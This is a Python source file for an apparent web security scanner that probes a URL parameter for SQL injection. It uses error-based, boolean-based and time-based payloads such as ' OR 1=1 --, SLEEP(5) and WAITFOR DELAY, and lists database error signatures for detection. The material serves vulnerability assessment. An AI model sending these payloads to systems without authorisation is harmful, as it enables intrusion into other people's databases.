"""
sqli_detector.py — SQL Injection Detector
==========================================
Advanced SQL injection detection using three techniques:
  1. Error-based  — database error strings in the response body
  2. Boolean-based — response-length difference on true vs false conditions
  3. Time-based   — measured response delay with SLEEP/WAITFOR payloads

Layer : Processing Layer
"""

import time
import logging
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

logger = logging.getLogger("sqli_detector")

# ─────────────────────────────────────────────────────────────
# Payload sets — grouped by detection technique
# ─────────────────────────────────────────────────────────────

ERROR_PAYLOADS: List[str] = [
    "'",
    "''",
    "\"",
    "\\",
    "1'",
    "1\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "'; SELECT 1 --",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
    "ORA-00933",
    "' || '1'='1",
    "a' OR 'a'='a",
]

BOOLEAN_PAYLOAD_PAIRS: List[Tuple[str, str]] = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 2>1", "1 AND 2<1"),
    ("' OR 'x'='x", "' OR 'x'='y"),
]

TIME_PAYLOADS: List[Dict] = [
    {"payload": "'; WAITFOR DELAY '0:0:5' --",  "db": "mssql",  "delay": 5},
    {"payload": "' OR SLEEP(5) --",              "db": "mysql",  "delay": 5},
    {"payload": "1; SELECT pg_sleep(5) --",      "db": "pgsql",  "delay": 5},
    {"payload": "' OR 1=1; WAITFOR DELAY '0:0:5' --", "db": "mssql", "delay": 5},
    {"payload": "1 AND SLEEP(5)",                "db": "mysql",  "delay": 5},
]

ERROR_SIGNATURES: List[str] = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "supplied argument is not a valid mysql",
    # PostgreSQL
    "pg_query()",
    "pg_exec()",
    "postgresql query failed",
    "pgsql error",
    "pg_result",
    # SQLite
    "sqlite error",
    "sqlite3.operationalerror",
    "sqlite_master",
    # MSSQL
    "microsoft ole db provider for sql server",
    "microsoft odbc sql server driver",
    "[sql server]",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "mssql_query()",
    # Oracle
    "oracle error",
    "ora-",
    "oracle odbc",
    "quoted string not properly terminated",
    # Generic
    "sql syntax",
    "database error",
    "db error",
    "sqlexception",
    "invalid query",
    "unterminated string",
    "syntax error",
    "unexpected end of sql command",
]

BOOLEAN_LENGTH_THRESHOLD = 0.20   # 20 % body-size difference → suspicious
TIME_THRESHOLD_FACTOR     = 0.85   # 85 % of requested delay → confirmed


# ─────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────

def _inject_param(url: str, param: str, value: str) -> str:
    parsed    = urlparse(url)
    qs        = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _has_error_sig(body: str) -> Tuple[bool, str]:
    lower = body.lower()
    for sig in ERROR_SIGNATURES:
        if sig.lower() in lower:
            return True, sig
    return False, ""


# ─────────────────────────────────────────────────────────────
# SQLiDetector
# ─────────────────────────────────────────────────────────────

class SQLiDetector:
    """
    Dedicated SQL injection detector.

    Runs error-based, boolean-based, and time-based checks
    against a single URL / parameter combination.

    Parameters
    ----------
    timeout       : per-request HTTP timeout (seconds)
    time_threshold: minimum delay (seconds) that counts as a hit
    user_agent    : User-Agent header value
    """

    def __init__(
        self,
        timeout:        int   = 10,
        time_threshold: float = 4.0,
        user_agent:     str   = "AegisSecurity/1.0 Web Application Assessment",
    ):
        self.timeout        = timeout
        self.time_threshold = time_threshold
        self._session       = requests.Session()
        self._session.headers.update({"User-Agent": user_agent})

    # ── internal request ──────────────────────────────────────

    def _get(self, url: str) -> Optional[requests.Response]:
        try:
            return self._session.get(
                url, timeout=self.timeout,
                allow_redirects=True, verify=True
            )
        except requests.exceptions.RequestException:
            return None

    # ── error-based ───────────────────────────────────────────

    def _run_error_based(self, url: str, param: str) -> List[Dict]:
        findings = []
        for payload in ERROR_PAYLOADS:
            injected = _inject_param(url, param, payload)
            resp     = self._get(injected)
            if resp is None:
                continue
            hit, sig = _has_error_sig(resp.text)
            if hit:
                findings.append({
                    "technique" : "error_based",
                    "payload"   : payload,
                    "evidence"  : f'DB error signature: "{sig}"',
                    "severity"  : "high",
                    "injected_url": injected,
                    "status_code" : resp.status_code,
                })
                logger.warning("[SQLi-ERROR] param=%s  sig=%s  url=%s",
                               param, sig, injected)
        return findings

    # ── boolean-based ─────────────────────────────────────────

    def _run_boolean_based(self, url: str, param: str) -> List[Dict]:
        findings = []
        for true_pl, false_pl in BOOLEAN_PAYLOAD_PAIRS:
            r_true  = self._get(_inject_param(url, param, true_pl))
            r_false = self._get(_inject_param(url, param, false_pl))
            if r_true is None or r_false is None:
                continue
            len_t, len_f = len(r_true.text), len(r_false.text)
            if len_t == 0:
                continue
            diff = abs(len_t - len_f) / len_t
            if diff >= BOOLEAN_LENGTH_THRESHOLD:
                findings.append({
                    "technique"   : "boolean_based",
                    "payload"     : f'TRUE: "{true_pl}"  /  FALSE: "{false_pl}"',
                    "evidence"    : (
                        f"Response size differs by {diff*100:.1f}%: "
                        f"true-condition={len_t}B, false-condition={len_f}B"
                    ),
                    "severity"    : "critical",
                    "injected_url": _inject_param(url, param, true_pl),
                    "status_code" : r_true.status_code,
                })
                logger.warning(
                    "[SQLi-BOOLEAN] param=%s diff=%.1f%%  url=%s",
                    param, diff * 100, url
                )
        return findings

    # ── time-based ────────────────────────────────────────────

    def _run_time_based(self, url: str, param: str) -> List[Dict]:
        findings = []
        for item in TIME_PAYLOADS:
            injected = _inject_param(url, param, item["payload"])
            t0       = time.monotonic()
            resp     = self._get(injected)
            elapsed  = time.monotonic() - t0
            if resp is None:
                continue
            if elapsed >= (item["delay"] * TIME_THRESHOLD_FACTOR):
                findings.append({
                    "technique"   : "time_based",
                    "payload"     : item["payload"],
                    "evidence"    : (
                        f"Response took {elapsed:.2f}s with "
                        f"SLEEP({item['delay']}) payload ({item['db']})"
                    ),
                    "severity"    : "critical",
                    "injected_url": injected,
                    "status_code" : resp.status_code,
                })
                logger.warning(
                    "[SQLi-TIME] param=%s elapsed=%.2fs db=%s url=%s",
                    param, elapsed, item["db"], url
                )
        return findings

    # ── public API ────────────────────────────────────────────

    def detect(self, url: str, param: str) -> Dict:
        """
        Run all three SQLi detection techniques on *url* / *param*.

        Returns
        -------
        dict
            url, param, findings (list), confirmed (bool),
            technique_summary, highest_severity
        """
        logger.info("[SQLiDetector] Testing %s  param=%s", url, param)

        error_hits   = self._run_error_based(url, param)
        boolean_hits = self._run_boolean_based(url, param)
        time_hits    = self._run_time_based(url, param)

        all_findings = error_hits + boolean_hits + time_hits

        # De-duplicate by technique (keep first hit per technique)
        seen, unique = set(), []
        for f in all_findings:
            if f["technique"] not in seen:
                seen.add(f["technique"])
                unique.append(f)

        confirmed = len(unique) > 0
        severities = [f["severity"] for f in unique]
        highest    = (
            "critical" if "critical" in severities else
            "high"     if "high"     in severities else
            "medium"   if "medium"   in severities else
            "low"      if severities else "none"
        )

        return {
            "url"             : url,
            "param"           : param,
            "vulnerability"   : "SQL Injection",
            "findings"        : unique,
            "confirmed"       : confirmed,
            "technique_summary": list(seen),
            "highest_severity": highest,
            "total_hits"      : len(unique),
        }